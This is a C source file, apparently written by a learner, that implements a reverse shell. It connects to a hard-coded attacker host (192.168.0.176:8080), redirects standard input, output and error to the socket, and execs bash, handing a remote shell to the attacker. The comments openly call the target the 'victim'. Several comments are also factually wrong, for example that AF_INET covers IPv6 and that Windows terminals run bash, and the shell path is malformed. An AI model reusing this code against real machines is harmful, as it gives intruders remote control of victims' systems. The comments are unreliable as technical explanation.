#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h> //system calls (eg: execve)
#include<sys/socket.h> //for connection local host and local port with ipv6 or v4
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h> // to encode the character given in the commands

void main(){

int sockt;
int port = 8080;
struct sockaddr_in revsockaddr; // reverse sock address and sockaddress are created as a strcuture for listening and binding to the victims machine
sockt = socket(AF_INET,SOCK_STREAM,0); //af_inet specifies ipv6 or v4, type should be of sock stream,0 is for avoiding error that will be caused if chosen tcp or udp
revsockaddr.sin_family = AF_INET; //assigning sin_family to get the version as ipv6 or ipv4
revsockaddr.sin_port = htons(port); // htons converts unsigned integer to network bytes i.e port will be converted into network bytes
revsockaddr.sin_addr.s_addr =  inet_addr("192.168.0.176"); //LHOST
connect(sockt,(struct sockaddr *) &revsockaddr,sizeof(revsockaddr)); // for connection between victim and attacker i.e conncting socket and reverse sockaddress
dup2(sockt,0);
dup2(sockt,1);
dup2(sockt,2); //dup2 function is for file descriptor otherwise it is unable to create reverse shell of kali linux machine
char * const argv[] = {"bin/bash",NULL}; // argv is a 1-d array and a bin bash command has been passed as bin bash because windows terminal runs on bash scripting
execve("bin/bash",argv,NULL); // execve is a powerfull linux system call used for exploitation
}
